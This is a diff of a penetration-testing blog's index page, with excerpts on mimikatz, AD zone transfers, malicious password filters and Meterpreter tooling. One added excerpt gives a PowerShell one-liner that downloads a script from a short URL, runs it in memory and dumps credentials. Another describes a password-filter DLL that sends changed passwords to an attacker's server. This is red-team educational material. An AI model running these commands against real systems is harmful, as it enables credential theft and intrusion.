@@ -219,6 +219,177 @@
     
       <article>
   <header>
+    <h2><a href="//room362.com/post/2014/2014-01-06-metasploit-minute-mondays-with-mubix/">Metasploit Minute - Mondays with Mubix - Episode 1</a></h2>
+
+    <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>06 Jan 2014, 14:30</time>
+  </div>
+
+  
+
+  
+
+  
+
+</div>
+
+  </header>
+
+  <p>
+  Show URL: Hak5 Youtube URL: YouTube Show RSS feed: RSS
+  </p>
+
+  
+</article>
+
+    
+  
+    
+      <article>
+  <header>
+    <h2><a href="//room362.com/post/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/">Dumping a domain worth of passwords with mimikatz</a></h2>
+
+    <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>05 Oct 2013, 23:53</time>
+  </div>
+
+  
+
+  
+
+  
+
+</div>
+
+  </header>
+
+  <p>
+  clymb3r recently posted a script called &ldquo;Invoke-Mimikatz.ps1&rdquo; basically what this does is reflectively injects mimikatz into memory, calls for all the logonPasswords and exits. It even checks the targets architecture (x86/x64) first and injects the correct DLL. You can very easily use this script directly from an admin command prompt as so: powershell &quot;IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds&quot; (This works REALLY well for Citrix and Kiosk scenarios and it&rsquo;s too hard to type/remember) This runs the powershell script by directly pulling it from Github and executing it &ldquo;in memory&rdquo; on your system.
+  </p>
+
+  
+  <footer>
+    <a href="/post/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+  </footer>
+  
+</article>
+
+    
+  
+    
+      <article>
+  <header>
+    <h2><a href="//room362.com/post/2013/2013-10-04-ad-zone-transfers-as-a-user/">AD Zone Transfers as a user</a></h2>
+
+    <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>04 Oct 2013, 23:47</time>
+  </div>
+
+  
+
+  
+
+  
+
+</div>
+
+  </header>
+
+  <p>
+  cross posted from: http://carnal0wnage.attackresearch.com/2013/10/ad-zone-transfers-as-user.html The tired and true method for Zone Transfers are using either nslookup: nslookup ls -d domain.com.local Or dig: dig -t AXFR domain.com.local @ns1.domain.com.local In the Windows Enterprise world there are a few more options. If you are a DNS Admin you can use the &lsquo;dnscmd&rsquo; command like so: dnscmd /EnumZones dnscmd /ZonePrint domain.com.local Which is handy if you can pop the DNS server (usually the Domain Controller so you usually have better things to do at that point).
+  </p>
+
+  
+  <footer>
+    <a href="/post/2013/2013-10-04-ad-zone-transfers-as-a-user/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+  </footer>
+  
+</article>
+
+    
+  
+    
+      <article>
+  <header>
+    <h2><a href="//room362.com/post/2013/2013-09-11-stealing-passwords-every-time-they-change/">Stealing passwords every time they change</a></h2>
+
+    <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>11 Sep 2013, 00:28</time>
+  </div>
+
+  
+
+  
+
+  
+
+</div>
+
+  </header>
+
+  <p>
+  Password Filters [0].aspx&rdquo;) are a way for organizations and governments to enforce stricter password requirements on Windows Accounts than those available by default in Active Directory Group Policy. It is also fairly documented on how to Install and Register Password Filters [1]. Basically what it boils down to is updating a registry key here: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages with the name of a DLL (without the extension) that you place in Windows\System32 For National CCDC earlier this year (2013), I created an installer and &ldquo;evil pass filter&rdquo; that basically installed itself as a password filter and any time any passwords changed it would store the change to a log file locally to the victim (in clear text) as well as issue an HTTP basic auth POST to a server I own with the username and password.
+  </p>
+
+  
+  <footer>
+    <a href="/post/2013/2013-09-11-stealing-passwords-every-time-they-change/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+  </footer>
+  
+</article>
+
+    
+  
+    
+      <article>
+  <header>
+    <h2><a href="//room362.com/post/2013/2013-09-10-changing-proxychains-hardcoded-dns-server/">Changing proxychains hardcoded DNS server</a></h2>
+
+    <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>10 Sep 2013, 13:16</time>
+  </div>
+
+  
+
+  
+
+  
+
+</div>
+
+  </header>
+
+  <p>
+  If you&rsquo;ve ever used proxychains to push things through Meterpreter, one of the most annoying things is its &ldquo;hardcoded&rdquo; DNS setting for 4.2.2.2, if the org that you are going after doesn&rsquo;t allow this out of their network, or if you are trying to resolve an internal asset, you&rsquo;re SOL. After a ton of googling and annoyed head slams into walls every time I forget where this is I&rsquo;ve finally decided to make a note of it.
+  </p>
+
+  
+  <footer>
+    <a href="/post/2013/2013-09-10-changing-proxychains-hardcoded-dns-server/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+  </footer>
+  
+</article>
+
+    
+  
+    
+      <article>
+  <header>
     <h2><a href="//room362.com/post/2013/2013-08-10-unkillable-processes/">Unkillable Processes</a></h2>
 
     <div class="post-meta">
@@ -410,180 +581,13 @@
 
     
   
-    
-      <article>
-  <header>
-    <h2><a href="//room362.com/post/2013/2013-05-30-query-all-windows-services-config-from-the-command-line-html/">Query all windows services config from the command line</a></h2>
-
-    <div class="post-meta">
-
-  <div>
-    <i class="fa fa-calendar fa-fw"></i>
-    <time>30 May 2013, 02:56</time>
-  </div>
-
-  
-
-  
-
-  
-
-</div>
-
-  </header>
-
-  <p>
-  This is how I did it: for /f &quot;tokens=5 delims=&quot; %A in ('reg query HKLM\SYSTEM\CurrentControlSet\Services') do sc qc %A Let me know if you know of a better way. If you don&rsquo;t know why this could be important read here: http://www.ihtb.org/security/program.exe-privilege_escalation.txt If you are on a Win7 box or otherwise have the option to use WMI you can use the following command: wmic service get pathname
-  </p>
-
-  
-</article>
-
-    
-  
-    
-      <article>
-  <header>
-    <h2><a href="//room362.com/post/2013/2013-04-08-sessiondump-meterpreter-extension/">Sessiondump Meterpreter Extension</a></h2>
-
-    <div class="post-meta">
-
-  <div>
-    <i class="fa fa-calendar fa-fw"></i>
-    <time>08 Apr 2013, 09:58</time>
-  </div>
-
-  
-
-  
-
-  
-
-</div>
-
-  </header>
-
-  <p>
-  Mimikatz is awesome right, so is WCE. But both have one fatal flaw, even though you can execute them in memory {link} - you still have to have the binaries, remember the command to execute it in memory, and ultimately transfer the entire binary over so that metasploit can do its thing. Then along came SessionDump. I only noticed this because someone was tweeting congratulations to someone on writing it: No blog post or huge Vegas lights talk on it at DefCon or Blackhat.
-  </p>
-
-  
-  <footer>
-    <a href="/post/2013/2013-04-08-sessiondump-meterpreter-extension/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-  </footer>
-  
-</article>
-
-    
-  
-    
-      <article>
-  <header>
-    <h2><a href="//room362.com/post/2013/2013-03-19-metasploit-mastery-blackhatevents-usa-2013/">Metasploit Mastery @BlackHatEvents USA 2013</a></h2>
-
-    <div class="post-meta">
-
-  <div>
-    <i class="fa fa-calendar fa-fw"></i>
-    <time>19 Mar 2013, 14:38</time>
-  </div>
-
-  
-
-  
-
-  
-
-</div>
-
-  </header>
-
-  <p>
-  Just a quick post to say that egypt and I will be giving Metasploit Mastery twice (2 x 2 day sessions) at BlackHat USA 2013. Come out and get your Metasploit on in Vegas w/ us Linky: http://www.blackhat.com/us-13/training/metasploit-mastery.html Current fill rate of July 27-28 session: Current fill rate of July 29-30 session: EOM
-  </p>
-
-  
-</article>
-
-    
-  
-    
-      <article>
-  <header>
-    <h2><a href="//room362.com/post/2013/2013-03-18-length-sorting-wordlists/">Length Sorting Wordlists</a></h2>
-
-    <div class="post-meta">
-
-  <div>
-    <i class="fa fa-calendar fa-fw"></i>
-    <time>18 Mar 2013, 20:01</time>
-  </div>
-
-  
-
-  
-
-  
-
-</div>
-
-  </header>
-
-  <p>
-  This is one of those stupid simple things that are easy to forget so I&rsquo;m posting it here. Wordlists and dictionaries are awesome for cracking password hashes, and although, thanks to things like Mimikatz and WCE I don&rsquo;t have to, but there is times where it&rsquo;s important. Now, having John, Hashcat, or Cain go through a dictionary is a 1-for-1 hit, no time wasted no matter how it&rsquo;s sorted and usually is best to sort them by most common first so you get earlier hits.
-  </p>
-
-  
-  <footer>
-    <a href="/post/2013/2013-03-18-length-sorting-wordlists/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-  </footer>
-  
-</article>
-
-    
-  
-    
-      <article>
-  <header>
-    <h2><a href="//room362.com/post/2013/2013-03-04-mounting-nfs-shares-through-meterpreter-with-nfspy/">Mounting NFS shares through Meterpreter with NfSpy</a></h2>
-
-    <div class="post-meta">
-
-  <div>
-    <i class="fa fa-calendar fa-fw"></i>
-    <time>04 Mar 2013, 21:20</time>
-  </div>
-
-  
-
-  
-
-  
-
-</div>
-
-  </header>
-
-  <p>
-  You&rsquo;ve found an NFS share on a pentest, it&rsquo;s sharing out your target&rsquo;s home directories (/home) and some SAN with all of the Windows AD users &ldquo;home&rdquo; directories under /volumes/users/. You only have a meterpreter session though&hellip; enough back story, problem is that Metasploit doesn&rsquo;t really have any auxiliary modules or otherwise to access the things on those shares. Please correct me if I&rsquo;m wrong, but there also aren&rsquo;t any tools for talking to NFS shares over TCP only proxies.
-  </p>
-
-  
-  <footer>
-    <a href="/post/2013/2013-03-04-mounting-nfs-shares-through-meterpreter-with-nfspy/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-  </footer>
-  
-</article>
-
-    
-  
 
   
 <nav class="pagination" role="pagination">
   
   <a href="/page/4/"><i class="fa fa-angle-double-left"></i></a>
   
-  <span>5 / 45</span>
+  <span>5 / 46</span>
   
   <a href="/page/6/"><i class="fa fa-angle-double-right"></i></a>
   
